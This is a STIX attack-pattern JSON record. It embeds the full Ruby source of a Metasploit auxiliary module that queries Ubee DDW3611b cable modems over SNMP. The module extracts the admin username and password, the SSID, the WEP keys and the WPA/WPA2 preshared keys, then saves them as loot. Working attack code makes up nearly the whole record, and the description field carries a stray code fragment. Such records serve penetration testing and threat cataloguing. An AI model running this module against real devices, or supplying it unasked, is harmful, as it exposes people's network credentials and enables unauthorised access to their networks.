{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b894dfa1-733d-44f2-8750-da16aea88ca0",
    "created": "2024-08-14T16:27:42.232811Z",
    "modified": "2024-08-14T16:27:42.232815Z",
    "name": "Ubee DDW3611b Cable Modem Wifi Enumeration",
    "description": " This module will extract WEP keys and WPA preshared keys from certain Ubee cable modems.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/snmp/ubee_ddw3611.rb",
            "external_id": "ubee_ddw3611.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Ubee DDW3611b Cable Modem Wifi Enumeration',\n      'Description' => %q{\n        This module will extract WEP keys and WPA preshared keys from\n        certain Ubee cable modems.\n      },\n      'References'  =>\n        [\n          [ 'URL', 'https://www.rapid7.com/blog/post/2014/05/15/r7-2014-01-r7-2014-02-r7-2014-03-disclosures-exposure-of-critical-information-via-snmp-public-community-string/' ]\n        ],\n      'Author'      => ['Deral \"PercentX\" Heiland'],\n      'License'     => MSF_LICENSE\n    )\n\n  end\n\n  def run_host(ip)\n      output_data = {}\n    begin\n      snmp = connect_snmp\n\n      if snmp.get_value('1.2.840.10036.2.1.1.9.12') =~ /DDW3611/\n        print_good(\"#{ip}\")\n        wifiinfo = \"\"\n\n        # System user account and Password\n        username = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.1.0')\n        print_good(\"Username: #{username}\")\n        wifiinfo << \"Username: #{username}\" << \"\\n\"\n        password = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.1.2.0')\n        print_good(\"Password: #{password}\")\n        wifiinfo << \"Password: #{password}\" << \"\\n\"\n\n        wifistatus = snmp.get_value('1.3.6.1.2.1.2.2.1.8.12')\n        if wifistatus == 1\n          ssid = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.1.14.1.3.12')\n          print_good(\"SSID: #{ssid}\")\n          wifiinfo << \"SSID: #{ssid}\" << \"\\n\"\n\n          # Wifi Security Version\n          wifiversion = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.1.14.1.5.12')\n          if wifiversion == \"0\"\n            print_line(\"Open Access Wifi is Enabled\")\n\n          # WEP enabled\n          elsif wifiversion == \"1\"\n          weptype = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.2.12')\n            if weptype == \"2\"\n              wepkey1 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.1')\n              key1 = \"#{wepkey1}\".unpack('H*')\n              print_good(\"WEP KEY1: #{key1}\")\n              wifiinfo << \"WEP KEY1: #{key1}\" << \"\\n\"\n              wepkey2 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.2')\n              key2 = \"#{wepkey2}\".unpack('H*')\n              print_good(\"WEP KEY2: #{key2}\")\n              wifiinfo << \"WEP KEY2: #{key2}\" << \"\\n\"\n              wepkey3 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.3')\n              key3 = \"#{wepkey3}\".unpack('H*')\n              print_good(\"WEP KEY3: #{key3}\")\n              wifiinfo << \"WEP KEY3: #{key3}\" << \"\\n\"\n              wepkey4 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.3.1.2.12.4')\n              key4 = \"#{wepkey4}\".unpack('H*')\n              print_good(\"WEP KEY4: #{key4}\")\n              wifiinfo << \"WEP KEY4: #{key4}\" << \"\\n\"\n              actkey = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.1.12')\n              print_good(\"Active Wep key is #{actkey}\")\n              wifiinfo << \"Active WEP key is KEY#: #{actkey}\" << \"\\n\"\n\n            elsif weptype == \"1\"\n              wepkey1 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.1')\n              key1 = \"#{wepkey1}\".unpack('H*')\n              print_good(\"WEP KEY1: #{key1}\")\n              wifiinfo << \"WEP KEY1: #{key1}\" << \"\\n\"\n              wepkey2 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.2')\n              key2 = \"#{wepkey2}\".unpack('H*')\n              print_good(\"WEP KEY2: #{key2}\")\n              wifiinfo << \"WEP KEY2: #{key2}\" << \"\\n\"\n              wepkey3 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.3')\n              key3 = \"#{wepkey3}\".unpack('H*')\n              print_good(\"WEP KEY3: #{key3}\")\n              wifiinfo << \"WEP KEY3: #{key3}\" << \"\\n\"\n              wepkey4 = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.2.1.2.12.4')\n              key4 = \"#{wepkey4}\".unpack('H*')\n              print_good(\"WEP KEY4: #{key4}\")\n              wifiinfo << \"WEP KEY4: #{key4}\" << \"\\n\"\n              actkey = snmp.get_value('1.3.6.1.4.1.4684.38.2.2.2.1.5.4.2.1.1.1.12')\n              print_good(\"Active Wep key is #{actkey}\")\n              wifiinfo << \"Active WEP key is KEY#: #{actkey}\" << \"\\n\"\n\n            else\n              print_line(\"FAILED\")\n            end\n\n          # WPA enabled\n          elsif wifiversion == \"2\"\n            print_line(\"Device is configured for WPA \")\n            wpapsk = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12')\n            print_good(\"WPA PSK: #{wpapsk}\")\n            wifiinfo << \"WPA PSK: #{wpapsk}\" << \"\\n\"\n\n          # WPA2 enabled\n          elsif wifiversion == \"3\"\n            print_line(\"Device is configured for WPA2\")\n            wpapsk2 = snmp.get_value('1.3.6.1.4.1.4491.2.4.1.1.6.2.2.1.5.12')\n            print_good(\"WPA2 PSK: #{wpapsk2}\")\n            wifiinfo << \"WPA PSK: #{wpapsk2}\" << \"\\n\"\n\n          # WPA Enterprise enabled\n          elsif wifiversion == \"4\"\n            print_line(\"Device is configured for WPA enterprise\")\n\n          # WPA2 Enterprise enabled\n          elsif wifiversion == \"5\"\n            print_line(\"Device is configured for WPA2 enterprise\")\n\n          # WEP 802.1x enabled\n          elsif wifiversion == \"6\"\n            print_line(\"Device is configured for WEP 802.1X\")\n\n          else\n            print_line(\"FAILED\")\n          end\n\n        else\n         print_line(\"WIFI is not enabled\")\n         end\n    end\n     # Woot we got loot.\n     loot_name     = \"ubee_wifi\"\n     loot_type     = \"text/plain\"\n     loot_filename = \"ubee_wifi.txt\"\n     loot_desc     = \"Ubee Wifi configuration data\"\n     p = store_loot(loot_name, loot_type, datastore['RHOST'], wifiinfo , loot_filename, loot_desc)\n     print_good(\"WiFi Data saved: #{p}\")\n\n     rescue ::SNMP::UnsupportedVersion\n     rescue ::SNMP::RequestTimeout\n     rescue ::Interrupt\n       raise $!\n     rescue ::Exception => e\n       print_error(\"#{ip} - Error: #{e.class} #{e}\")\n     disconnect_snmp\n     end\n  end\nend\n",
    "x_mitre_contributors": [
        "[Deral \"PercentX\" Heiland]",
        ""
    ]
}